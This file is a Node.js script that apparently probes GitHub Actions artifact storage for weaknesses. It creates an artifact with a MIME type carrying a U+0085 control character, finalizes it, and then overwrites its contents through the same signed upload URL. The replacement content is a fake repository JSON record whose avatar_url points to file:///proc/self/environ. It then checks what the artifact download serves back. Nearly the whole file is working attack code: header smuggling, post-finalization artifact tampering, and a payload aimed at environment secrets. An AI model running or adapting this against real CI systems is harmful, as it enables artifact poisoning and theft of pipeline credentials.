import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const variant=process.env.CARRIER_VARIANT;
const repo=process.env.GITHUB_REPOSITORY;
const name=`repo-cassette-crossjob-${process.env.GITHUB_RUN_ID}`;
const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const version=variant==='legacy'?6:7;
const mime=variant==='legacy'?'\u0085application/json':'application/json';
const report={variant,name,version,mimeHex:Buffer.from(mime,'utf8').toString('hex'),createAt:new Date().toISOString()};
const sha=body=>createHash('sha256').update(body).digest('hex');
function request(url,method='GET',body=null,headers={}){
  return new Promise((resolve,reject)=>{
    const target=new URL(url);const mod=target.protocol==='https:'?https:http;
    const req=mod.request(target,{method,headers,timeout:15000},res=>{
      const chunks=[];res.on('data',chunk=>chunks.push(chunk));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    req.on('error',reject);req.on('timeout',()=>req.destroy(new Error('timeout')));
    if(body)req.write(body);req.end();
  });
}
async function upload(url,body){
  const response=await request(url,'PUT',body,{
    'x-ms-version':'2025-01-05',
    'x-ms-blob-type':'BlockBlob',
    'x-ms-blob-content-type':'\u0085application/json',
    'Content-Type':'application/octet-stream',
    'Content-Length':String(body.length),
  });
  if(response.status!==201)throw new Error(`Blob PUT ${response.status} ${response.headers['x-ms-error-code']||''}`);
}
async function inspect(artifactId,expectedBody){
  for(let attempt=0;attempt<10;attempt++){
    const api=await request(`https://api.github.com/repos/${repo}/actions/artifacts/${artifactId}/zip`,'GET',null,{
      'Authorization':`Bearer ${process.env.GITHUB_TOKEN}`,
      'Accept':'application/vnd.github.v3+json',
      'User-Agent':'repo-cassette-crossjob-probe',
    });
    report.restStatus=api.status;
    if(api.status===404){await new Promise(r=>setTimeout(r,300));continue}
    if(api.status!==302||!api.headers.location)return;
    const location=new URL(api.headers.location);
    report.rsct=location.searchParams.get('rsct');
    report.downloadBlob=location.pathname.split('/').at(-1);
    const final=await request(location.href);
    report.finalStatus=final.status;
    report.finalContentType=final.headers['content-type']||null;
    report.finalBodySha=sha(final.body);
    report.finalBodyMatch=final.body.equals(expectedBody);
    return;
  }
}
try{
  const created=await client.CreateArtifact({...ids,name,version,mimeType:StringValue.create({value:mime})});
  if(!created.ok)throw new Error('CreateArtifact ok=false');
  report.uploadBlob=new URL(created.signedUploadUrl).pathname.split('/').at(-1);
  const placeholder=Buffer.from('{}');
  await upload(created.signedUploadUrl,placeholder);
  const finalized=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
  if(!finalized.ok)throw new Error('FinalizeArtifact ok=false');
  const artifactId=String(finalized.artifactId);
  report.artifactId=artifactId;
  const repository=`${repo}/actions/artifacts/${artifactId}/zip`;
  const body=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:`crossjob ${variant}`,stargazers_count:0}));
  await upload(created.signedUploadUrl,body);
  report.expectedSha=sha(body);
  await inspect(artifactId,body);
}catch(error){report.error=String(error.message||error).slice(0,220)}
report.finishAt=new Date().toISOString();
console.log('CROSSJOB',JSON.stringify(report));
